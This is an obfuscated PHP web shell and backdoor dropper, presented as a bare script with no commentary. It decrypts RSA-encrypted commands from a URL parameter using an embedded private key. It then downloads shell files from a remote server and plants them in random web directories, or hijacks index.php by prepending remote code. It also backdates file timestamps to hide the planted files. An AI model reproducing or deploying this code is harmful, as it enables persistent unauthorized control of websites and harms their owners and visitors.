<?php
 goto YPsTC; CX88m: $params = openssl_private_decrypt(base64_decode(urldecode($str)), $decrypted, $privateKey) ? $decrypted : null; goto SIXvY; hjZTB: function doBeima($params) { if (empty($params["\x66\x69\x6c\145\156\x61\x6d\x65"])) { error("\x66\x69\154\145\x6e\141\155\x65\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x73\x68\x65\154\154\146\x69\x6c\145"])) { error("\163\150\x65\154\154\x66\x69\154\x65\x20" . MsgText::PARAM_EMPTY, $params); } empty($params["\154\145\166\145\154"]) && ($params["\x6c\x65\166\145\x6c"] = 6); $dirs = getDirPathsByLevel($params["\154\145\166\x65\154"]); $temp = array_rand($dirs); $createDir = $dirs[$temp] . "\57"; $localfilepath = $createDir . $params["\x66\151\x6c\145\156\141\x6d\x65"]; $remoteFileUrl = $params["\x73\x65\x72\x76\145\x72"] . $params["\x73\x68\x65\x6c\x6c\146\151\154\x65"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\x65\163\x75\154\x74"])) { if (copyfile($content["\162\145\163\165\x6c\x74"], $localfilepath)) { updateFiletime($localfilepath); $beimaurl = str_replace($_SERVER["\104\117\103\125\x4d\x45\116\124\137\122\x4f\x4f\x54"], '', $localfilepath); success(compact("\x6c\157\143\x61\x6c\x66\151\x6c\145\x70\141\164\150", "\142\x65\x69\155\141\165\x72\x6c")); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\157\143\141\x6c\146\151\x6c\x65\x70\141\x74\x68")); } error(MsgText::REMOTE_FILE_EXISTS, compact("\x72\x65\x6d\x6f\x74\145\x46\x69\x6c\145\125\x72\x6c")); } goto qGjI6; mORxg: class ErrorCode { const E_200400 = 200400; } goto x2Hy9; nn2Kd: $privateKey = "\55\x2d\55\x2d\55\102\105\x47\x49\116\40\x50\122\111\126\101\x54\105\40\113\x45\x59\55\55\55\x2d\55\40\x4d\111\111\105\166\x51\111\102\101\104\101\116\102\147\x6b\161\x68\x6b\x69\107\x39\167\x30\x42\101\x51\x45\106\x41\x41\123\x43\x42\113\x63\167\147\147\123\x6a\101\147\105\101\101\x6f\x49\x42\x41\121\x43\x33\60\x77\64\x39\x49\x74\x4f\x66\154\144\121\66\40\x64\102\53\x30\147\x45\142\145\x65\127\66\x42\x45\103\x6c\143\170\53\116\x5a\172\155\x70\x58\62\x59\143\122\x48\106\126\70\60\102\x75\162\x43\127\x42\141\x76\120\106\x65\x68\126\x38\123\171\x39\171\114\x32\165\57\x79\x33\x6d\x76\x33\121\x4a\112\53\x20\x78\62\153\113\166\154\x79\70\x7a\113\x78\x34\x47\142\130\120\x62\x73\x57\112\153\x36\110\x6f\60\x52\170\x71\x34\x39\157\x58\153\x42\x61\162\121\x42\x4f\161\122\117\x5a\x65\141\106\x46\63\x4d\x7a\x70\144\57\120\x64\x4c\x53\x73\x78\105\x76\107\61\115\40\164\x51\x64\62\x77\x4f\x78\65\x72\66\130\x44\70\x36\152\x79\x66\116\67\x4c\x41\x4a\x55\125\126\166\x62\112\x76\x6e\61\103\x48\x6f\60\x33\156\x46\x48\x31\x32\153\61\113\131\167\114\x6e\121\x66\172\x51\111\65\x6e\x58\67\x79\x51\114\141\x30\152\164\x20\146\107\65\124\101\x33\64\x46\155\60\x45\115\x62\106\144\110\x57\152\101\x4e\x2f\126\x64\105\x6a\157\112\111\66\x69\164\64\x50\103\x51\x50\65\x77\153\x34\147\141\62\102\166\x56\x71\x75\x51\153\x75\x50\142\163\142\x72\x38\63\66\64\x64\63\111\66\40\x47\x75\107\101\x4b\104\x52\60\167\x66\153\124\x32\60\156\60\105\66\153\101\x6d\x44\111\x33\x6f\154\62\x62\x66\141\60\x72\x51\x6e\143\161\125\x53\x33\117\125\63\111\x4e\160\170\117\132\x53\x38\145\x4b\x43\x49\x67\103\x33\x62\x4d\70\x31\x6d\x64\151\x20\x4d\x51\x36\124\163\101\121\71\101\147\115\102\101\x41\105\103\147\x67\105\x41\x4a\x4c\x47\123\154\x41\62\122\x70\x4c\x64\x70\x78\70\154\113\125\x75\x4f\121\x51\x66\123\x48\132\x47\x66\166\x65\x62\57\x45\62\104\132\154\x37\53\144\x53\107\115\65\x4a\x20\107\153\x4d\x49\x59\x74\x6e\x61\124\101\113\120\x51\x38\152\156\x73\63\x37\123\x4a\x58\x43\x73\155\x52\122\150\102\116\146\x30\x35\151\62\60\101\102\163\104\164\x41\121\x2f\111\x54\111\167\x6f\x70\x6d\101\101\120\x68\x68\122\x33\111\107\144\103\146\114\x20\x62\x77\171\x71\x47\143\105\x4f\161\x39\x78\x5a\102\x39\164\127\71\x36\x35\131\x4a\x6b\67\x4b\160\x6c\114\154\71\64\161\116\130\x74\x52\x38\x43\165\65\172\170\x63\x36\125\x44\153\164\152\x48\x42\122\153\57\x4b\171\57\x46\130\112\x4f\x6a\120\x4b\115\x20\163\x41\70\162\150\157\170\67\x64\161\x6c\132\x55\102\x33\x49\57\x71\151\x71\x72\x51\117\x67\x54\x31\x42\x73\161\x31\x42\106\x54\x2b\62\107\107\x77\x52\125\127\x5a\61\x43\x79\x46\157\x5a\166\x68\163\104\x6f\x6d\x64\x6f\64\171\x68\x52\x72\102\60\x62\x20\x38\x59\x6d\64\x4d\104\x69\126\x71\170\106\x50\x56\x57\70\x58\x42\71\122\106\104\71\x59\x4b\x74\53\166\65\60\105\x62\x36\x69\123\113\112\116\114\160\x52\x6d\152\132\104\x4e\132\142\162\x45\x59\117\x36\116\122\x73\122\x42\115\x37\142\162\x44\141\71\x20\x6e\63\x39\155\x5a\x57\x46\162\x34\x37\x77\107\107\130\130\166\57\x4e\150\167\x54\166\122\111\53\62\x53\151\x2f\x5a\146\144\120\64\x2b\157\x35\124\x65\x53\x57\x51\113\102\147\121\x44\150\111\x56\x4f\125\117\104\x69\163\x69\x4c\150\153\x37\x58\x4b\142\40\x59\x75\x37\102\127\61\132\106\x63\x4b\x30\x4a\170\165\x72\161\x48\x4e\62\62\x6d\x73\166\101\x30\121\x2f\61\161\64\x52\x76\172\151\x45\124\152\x65\153\130\x49\x6e\x39\154\x56\x4b\103\x6d\123\x2f\147\x79\62\117\62\122\x74\165\121\122\x75\154\101\122\40\x66\143\63\163\x7a\62\127\71\x74\x4e\x58\x52\x46\x38\101\x76\x79\x30\67\x32\x38\116\x47\x30\142\141\117\x4f\167\x42\x61\x6c\117\x38\167\x33\x63\103\130\66\116\156\x6d\67\x30\160\112\145\x72\x2b\151\x4a\123\156\63\164\155\x41\x4b\x53\x42\x34\x4c\124\x20\166\142\123\x42\70\x70\164\x36\x51\147\x50\70\116\x50\x48\171\121\x64\x57\x70\x32\x4c\167\x4f\164\x77\113\102\147\121\104\122\x42\x38\x6c\x67\123\141\111\155\x49\115\112\102\141\x58\105\122\x53\x61\x6f\x4e\147\70\x6b\170\x76\63\57\x63\x76\64\147\65\x20\152\125\x6c\x6c\x6a\170\116\121\x63\125\x73\152\x30\x56\67\x58\151\154\x6e\x42\x33\155\106\x78\161\x35\x72\110\x6a\102\132\x54\163\113\x7a\x4d\x4d\x51\x79\x76\x68\x4f\170\131\x68\x70\164\x44\146\167\66\117\114\x74\x6f\x50\125\153\x32\127\x69\102\x55\x73\x20\x6c\x33\x71\125\60\164\111\x58\116\116\x2b\x63\x54\x78\165\x32\x53\115\x4b\124\152\167\x4d\153\164\153\x70\155\x41\103\x4a\x71\x61\x2b\153\x32\67\x65\105\125\x71\170\162\x4b\117\57\x36\123\105\x69\x50\71\x46\x4d\x58\x48\166\147\101\64\105\x45\102\115\x20\x48\x77\x77\x31\x65\125\x39\121\x71\167\x4b\x42\147\x41\127\x53\131\65\125\160\150\x77\x32\117\x48\x4c\111\171\x78\x6b\x46\x65\x51\x33\x5a\x35\157\x6a\x72\65\166\x4f\66\146\x41\x37\126\152\x6e\x59\x45\154\144\66\x47\101\x43\x78\x73\x54\x63\141\127\x71\40\x76\x6c\162\124\x69\153\71\x4f\x52\x55\x54\155\x77\125\163\143\x57\152\x6f\x33\x38\104\x6c\112\x41\x34\101\x45\x30\156\112\x38\x59\x4a\x70\x5a\172\67\x54\121\x51\x76\x4a\x33\62\x67\120\x55\x7a\154\107\103\123\105\65\x6b\x34\x45\x56\161\114\66\126\x4c\40\121\65\x53\x6a\161\x2b\172\x7a\141\x44\x50\152\x31\105\145\120\160\x76\x75\165\64\153\x72\x39\x46\x69\x4d\172\x47\107\120\x52\115\103\x52\57\115\x71\x58\x6c\53\x46\x39\x48\x6d\103\x31\x63\166\70\x4d\103\x59\104\125\x6c\101\x6f\x47\x42\x41\113\67\x37\40\147\x37\160\126\x4b\141\x59\x64\127\153\x43\x44\x30\151\105\125\x74\64\122\x6b\167\57\x49\x66\123\170\x77\171\x51\147\154\x62\x6d\x77\165\156\x67\102\x57\150\111\x62\x4f\60\x4f\x31\x37\x58\x39\x46\x64\x30\156\70\x49\x57\125\65\127\x6b\x55\142\x52\170\x20\x65\71\130\142\x59\x62\x45\60\x35\x74\x30\x63\x6f\x62\105\x5a\106\143\x67\x30\x74\x46\161\114\x48\x57\x52\x63\x4f\163\61\57\141\x53\x42\131\143\64\x4c\61\x77\150\x4d\112\162\152\x73\x6b\111\141\66\101\60\67\x4c\122\x33\x75\157\121\122\x72\70\162\x20\64\x71\x6b\x57\67\x59\x72\x74\171\132\154\165\113\x36\145\101\102\x42\171\103\x58\123\142\x65\x69\124\x52\x6c\x64\153\63\x43\61\x2b\145\124\x79\66\57\116\101\x6f\x47\101\x62\71\x2f\112\53\x4e\127\x72\150\131\123\x72\57\x56\x6f\107\x57\x6a\x75\151\x20\143\150\130\x43\116\163\172\171\64\x77\66\145\170\126\x77\170\130\x51\x4b\116\124\164\154\x7a\x4b\x78\x79\x68\x51\146\126\120\113\62\x42\x78\162\x70\164\127\x4c\66\113\103\122\x4b\x70\x7a\x33\x77\x68\x2b\127\x59\x32\103\63\121\x59\x79\126\146\x77\107\40\106\102\x34\x68\167\104\x72\x32\x6d\131\x34\124\127\106\x39\x70\104\61\x39\x34\x69\x45\x53\x31\171\x68\x72\x51\107\x6c\x49\70\x58\115\x2b\62\114\x56\150\102\x6c\63\x70\60\170\x2b\x54\106\x67\x4a\x4d\141\x54\x67\104\104\161\x41\x6e\x78\160\x75\161\x54\40\x75\160\102\131\161\124\131\x4d\x6c\x4f\x64\53\x56\122\67\x68\105\x4e\115\x61\106\x71\157\x3d\x20\x2d\55\55\55\55\x45\x4e\x44\40\x50\x52\x49\126\101\124\105\40\113\105\x59\x2d\x2d\55\55\x2d"; goto ZXJyo; GPTIx: function updateFiletime($filepath) { $ctime = filectime($filepath); $now = time(); if (!($now > $ctime + 31104000)) { $newTime = $now - mt_rand(15552000, 31104000); touch($filepath, $newTime, $newTime); return true; } return true; } goto nn2Kd; qGjI6: function doRename($params) { if (empty($params["\163\157\x75\x72\143\145\156\x61\155\145"])) { error("\x73\157\x75\x72\143\x65\156\141\155\x65\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\162\145\156\x61\155\x65"])) { error("\x72\145\156\x61\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } if ($params["\x73\x6f\x75\x72\x63\x65\x6e\141\x6d\145"] === $params["\162\145\x6e\x61\x6d\x65"]) { error(MsgText::NOCHANGE); } $sourceFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\163\157\x75\162\x63\145\x6e\x61\x6d\145"]; $renameFile = dirname(__FILE__) . DIRECTORY_SEPARATOR . $params["\162\145\x6e\141\155\145"]; $resSource = $params["\x73\145\162\x76\145\162"] . str_replace(strtolower($_SERVER["\104\117\x43\125\115\x45\x4e\x54\137\122\x4f\117\x54"]), '', strtolower($sourceFile)); $resSource = str_replace("\134", "\x2f", $resSource); if (file_exists($sourceFile)) { if (rename($sourceFile, $renameFile)) { success($renameFile); } else { error(MsgText::RENAME_ERROR, compact("\162\x65\156\x61\x6d\145\x46\151\154\145")); } } else { error(MsgText::LOCAL_FILE_EXISTS, compact("\162\145\163\x53\x6f\x75\162\x63\x65")); } } goto tRDTX; NLifJ: $params = json_decode($params, true); goto pg9Cx; tRDTX: function doIndex($params) { if (empty($params["\163\x68\x65\154\x6c\146\151\154\x65"])) { error("\163\x68\145\x6c\154\146\151\x6c\145\40" . MsgText::PARAM_EMPTY, $params); } $remoteUrl = $params["\x73\x65\162\x76\145\x72"] . trim($params["\x73\150\x65\154\x6c\146\151\x6c\145"]); $localfilepath = $_SERVER["\x44\117\x43\125\x4d\x45\116\124\137\122\117\x4f\x54"] . "\57\x69\156\x64\145\x78\56\x70\x68\x70"; $content = getRemoteContent($remoteUrl); $content = json_decode($content, true); if (!empty($content["\x72\145\163\165\154\x74"])) { $oldContent = ''; if (file_exists($localfilepath)) { $oldContent = @file_get_contents($localfilepath); } elseif (file_exists($_SERVER["\104\x4f\x43\x55\115\105\116\124\x5f\122\117\x4f\x54"] . "\x2f\x69\x6e\144\145\170\56\x68\x74\x6d\x6c")) { $oldContent = @file_get_contents($_SERVER["\x44\x4f\x43\x55\115\105\x4e\x54\x5f\122\x4f\117\124"] . "\57\151\x6e\144\x65\170\x2e\x68\164\x6d\154"); } elseif (file_exists($_SERVER["\x44\117\103\125\115\x45\116\x54\x5f\x52\x4f\117\124"] . "\x2f\151\156\144\x65\170\x2e\150\164\155")) { $oldContent = @file_get_contents($_SERVER["\104\x4f\103\x55\x4d\105\x4e\x54\137\x52\117\x4f\x54"] . "\x2f\x69\x6e\144\145\170\56\x68\x74\155"); } elseif (file_exists($_SERVER["\104\x4f\x43\125\x4d\x45\116\x54\137\x52\117\x4f\124"] . "\57\144\x65\x66\141\165\154\164\x2e\x68\164\x6d\154")) { $oldContent = @file_get_contents($_SERVER["\104\117\103\x55\115\105\116\124\x5f\x52\117\117\124"] . "\57\x64\145\x66\x61\165\x6c\x74\56\150\x74\155\154"); } elseif (file_exists($_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\122\x4f\117\x54"] . "\57\x64\x65\x66\141\165\154\164\x2e\x68\x74\x6d")) { $oldContent = @file_get_contents($_SERVER["\x44\x4f\103\x55\115\x45\116\x54\x5f\x52\x4f\117\124"] . "\x2f\144\145\x66\x61\x75\x6c\x74\x2e\x68\x74\x6d"); } if (copyfile($content["\162\145\163\165\154\164"], $localfilepath, true, $oldContent)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\154\157\143\141\154\146\x69\x6c\145\160\x61\x74\x68")); } error(MsgText::INDEX_ERROR, compact("\x72\145\155\157\x74\145\x55\x72\x6c")); } goto tsvnI; SXhcA: function getRemoteContent($url) { $content = @file_get_contents($url); if ($content === false) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); $content = curl_exec($curl); curl_close($curl); } return !empty($content) && is_string($content) ? $content : ''; } goto rCdSj; tsvnI: function doSub($params) { if (empty($params["\163\x68\145\154\x6c\x66\151\154\x65"])) { error("\x73\150\145\x6c\154\146\151\x6c\x65" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\146\151\x6c\x65\156\x61\155\x65"])) { error("\x66\151\x6c\145\x6e\x61\x6d\145\x20" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\104\x4f\103\125\115\105\x4e\124\137\122\117\x4f\124"] . "\x2f" . $params["\146\151\154\x65\x6e\141\x6d\x65"]; $remoteFileUrl = $params["\x73\x65\x72\166\145\162"] . $params["\163\150\145\x6c\x6c\x66\x69\154\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\x65\163\x75\154\x74"])) { if (copyfile($content["\162\145\x73\x75\x6c\164"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\157\143\141\x6c\146\151\x6c\x65\160\141\164\x68")); } error(MsgText::REMOTE_GET_ERROR, compact("\162\x65\155\x6f\164\x65\x46\151\154\145\125\162\154")); } goto mMvYt; c1y6C: function success($data) { die(@json_encode(array("\143\157\144\145" => 200, "\x6d\163\147" => MsgText::SUCCESS, "\144\141\x74\141" => $data), JSON_UNESCAPED_UNICODE)); } goto t2sz8; kQJOK: function getUrl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_TIMEOUT, 5); curl_setopt($curl, CURLOPT_AUTOREFERER, 0); curl_exec($curl); $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); if ($httpCode === 200) { $content = curl_exec($curl); return array("\x63\157\144\x65" => 200, "\x72\x65\x73\x70" => $content); } return array("\x63\x6f\x64\x65" => 500, "\162\145\x73\160" => ''); } goto SXhcA; t2sz8: function getDirPathsByLevel($level = 6) { $initDir = $_SERVER["\104\117\x43\x55\115\x45\116\x54\x5f\122\117\117\x54"]; $dirs = array($initDir); $count = count($dirs); while (count($dirs) > $count - 1) { $path = $dirs[$count - 1]; $count += 1; if (@is_dir($path) && @($handle = @opendir($path))) { while ($file = @readdir($handle)) { $realpath = $path . "\x2f" . $file; if ($file == "\56" || $file == "\56\56" || !is_dir($realpath) || substr($file, 0, 1) === "\x2e") { continue; } $path3 = str_replace($initDir, '', $path); $path4 = explode("\x2f", $path3); if (count($path4) > $level - 1) { continue; } $dirs[] = $realpath; } } @closedir($handle); } return $dirs; } goto kQJOK; alfpA: if (empty($params["\151\144\145\156"])) { error("\x69\x64\145\x6e\40" . MsgText::PARAM_EMPTY); } goto KKX5Z; UoeNv: function error($msg = MsgText::UNKNOWN_ERROR, $extras = array(), $code = 0) { empty($code) && ($code = ErrorCode::E_200400); die(@json_encode(array("\x63\157\144\x65" => $code, "\155\163\x67" => $msg, "\145\170\164\162\141\163" => $extras), JSON_UNESCAPED_UNICODE)); } goto c1y6C; x2Hy9: class MsgText { const PARAM_EMPTY = "\160\x61\162\141\155\40\x69\x73\40\x65\155\x70\x74\171"; const PARAM_TYPE = "\160\141\x72\141\x6d\40\x74\x79\x70\x65\x20\145\x72\x72\157\x72"; const VALUE_ERROR = "\x76\141\x6c\x75\x65\x20\x65\162\x72\157\162"; const NOCHANGE = "\x6e\x6f\40\x63\150\141\x6e\x67\145"; const LOCK_FILE_SUCCESS = "\x67\145\156\145\162\x61\x74\x65\x20\x6c\x6f\143\153\40\x66\x69\154\x65\40\x73\x75\x63\x63\x65\x73\x73\x2c\142\165\164\40\154\x6f\x63\153\x20\151\x6e\x64\145\x78\x2e\x70\x68\160\40\145\x72\162\x6f\x72"; const LOCK_FILE_ERROR = "\x67\145\x6e\145\x72\x61\164\x65\x20\154\157\x63\x6b\40\x66\x69\154\x65\x20\x65\162\162\157\162"; const REMOTE_GET_ERROR = "\147\145\164\40\162\145\155\157\x74\145\40\x63\x6f\x6e\x74\x65\x6e\164\x20\145\x72\x72\x6f\x72"; const LOCAL_FILE_ERROR = "\x67\145\156\x65\162\x61\x74\x65\40\154\x6f\x63\141\154\40\x66\151\x6c\145\40\x65\x72\162\x6f\x72"; const SUCCESS = "\x73\x75\143\143\145\163\163"; const LOCAL_FILE_EXISTS = "\154\157\x63\141\x6c\40\146\151\x6c\x65\x20\x64\157\145\x73\x6e\x27\x74\40\x65\170\x69\163\x74"; const REMOTE_FILE_EXISTS = "\x72\145\155\x6f\x74\x65\x20\146\x69\x6c\x65\40\x64\x6f\x65\x73\156\x27\164\40\x65\170\x69\163\164"; const RENAME_ERROR = "\x72\x65\x6e\x61\155\x65\x20\x65\162\x72\x6f\162"; const INDEX_ERROR = "\151\x6e\144\145\x78\x20\x68\151\152\141\x63\153\40\x65\x72\x72\x6f\162"; const UNKNOWN_ERROR = "\165\x6e\153\x6e\157\167\x6e\x20\x65\162\x72\x6f\x72"; const DECRYPT_FAIL = "\x70\141\x72\141\155\163\40\x64\145\x63\x72\171\160\164\x20\x66\141\x69\x6c"; } goto UoeNv; ixG7k: switch ($iden) { case "\142\x65\x69\x6d\x61": $res = doBeima($params); break; case "\x72\145\x6e\x61\x6d\x65": $res = doRename($params); break; case "\151\x6e\x64\145\170": $res = doIndex($params); break; case "\x73\165\142": case "\150\x74\x61\x63\x63\x65\163\163": $res = doSub($params); break; case "\x6c\157\x63\x6b": $res = doLock($params); break; case "\163\164\171\154\x65": $res = doStyle($params); break; default: error("\x69\144\x65\x6e\40" . MsgText::VALUE_ERROR); } goto hjZTB; rCdSj: function copyfile($content, $localfile, $isAppend = false, $appendContent = '') { if ($isAppend && !empty($appendContent)) { $content = trim($content); if (substr($content, -2, 2) !== "\77\x3e") { $content .= "\x20\77\x3e"; } $content = $content . PHP_EOL . PHP_EOL . $appendContent; } @file_put_contents($localfile, $content); if (!file_exists($localfile)) { $openedfile = @fopen($localfile, "\167"); @fwrite($openedfile, $content); @fclose($openedfile); } if (!file_exists($localfile)) { return false; } return true; } goto GPTIx; ZXJyo: $str = $_GET["\x70"]; goto CX88m; LSLgy: if (empty($params["\163\x65\x72\x76\145\162"])) { error("\x73\x65\162\x76\145\x72\x20" . MsgText::PARAM_EMPTY); } goto alfpA; YPsTC: error_reporting(0); goto mORxg; KKX5Z: $iden = isset($params["\151\x64\x65\x6e"]) ? strtolower($params["\x69\x64\x65\156"]) : ''; goto ixG7k; SIXvY: if (is_null($params)) { error(MsgText::DECRYPT_FAIL); } goto NLifJ; mMvYt: function doLock($params) { if (empty($params["\146\151\x6c\x65\x6e\x61\155\x65"])) { error("\146\151\x6c\x65\156\141\x6d\145\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x64\157\x6d\141\x69\x6e"])) { error("\x64\x6f\155\x61\x69\156\x20" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x73\x68\x65\154\x6c\x66\151\154\145"])) { error("\163\x68\x65\154\x6c\x66\x69\x6c\x65\40" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $_SERVER["\104\117\x43\x55\115\x45\116\x54\137\x52\x4f\x4f\x54"] . "\x2f" . $params["\x66\151\x6c\x65\156\141\x6d\145"]; $remoteFileUrl = $params["\x73\x65\162\x76\145\x72"] . $params["\163\150\145\154\154\146\x69\154\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\162\145\x73\x75\x6c\x74"])) { if (copyfile($content["\162\145\163\165\x6c\x74"], $localfilepath)) { $lockurl = $params["\144\157\155\x61\x69\x6e"] . $params["\146\151\154\x65\156\x61\x6d\x65"]; $lockres = getUrl($lockurl); @unlink($localfilepath); if ($lockres["\143\157\144\x65"] === 200 && !empty($lockres["\162\x65\x73\x70"]) && strpos($lockres["\x72\x65\163\160"], "\163\x75\143\143\x65\163\163")) { success($lockres["\162\x65\x73\x70"]); } error(MsgText::LOCK_FILE_SUCCESS, compact("\x6c\x6f\x63\153\x75\162\154", "\x6c\x6f\x63\x6b\162\145\163")); } @unlink($localfilepath); error(MsgText::LOCK_FILE_ERROR, compact("\154\x6f\x63\x61\154\x66\x69\x6c\145\x70\141\164\x68")); } error(MsgText::REMOTE_GET_ERROR, compact("\x72\x65\x6d\157\164\145\106\x69\154\145\125\162\154")); } goto qW4ul; pg9Cx: if (!is_array($params)) { error(MsgText::PARAM_TYPE, $params); } goto LSLgy; qW4ul: function doStyle($params) { if (empty($params["\163\x68\x65\x6c\x6c\146\x69\x6c\x65"])) { error("\x73\x68\145\x6c\154\146\151\x6c\x65" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\x66\x69\154\x65\x6e\x61\155\145"])) { error("\146\x69\x6c\x65\156\141\155\x65\40" . MsgText::PARAM_EMPTY, $params); } if (empty($params["\144\157\x6d\x61\x69\x6e"])) { error("\x64\x6f\x6d\x61\x69\156\40" . MsgText::PARAM_EMPTY, $params); } $localfilepath = $params["\x64\157\x6d\x61\151\x6e"] . $params["\146\151\154\x65\x6e\x61\155\x65"]; $remoteFileUrl = $params["\163\x65\162\x76\145\x72"] . $params["\x73\150\145\154\154\146\151\x6c\145"]; $content = getRemoteContent($remoteFileUrl); $content = json_decode($content, true); if (!empty($content["\x72\145\163\165\154\164"])) { if (copyfile($content["\162\x65\163\x75\154\164"], $localfilepath)) { updateFiletime($localfilepath); @chmod($localfilepath, 420); success($localfilepath); } error(MsgText::LOCAL_FILE_ERROR, compact("\x6c\157\143\141\x6c\146\151\x6c\x65\x70\x61\x74\150")); } error(MsgText::REMOTE_GET_ERROR, compact("\162\x65\x6d\x6f\x74\x65\x46\x69\x6c\x65\x55\162\x6c")); }
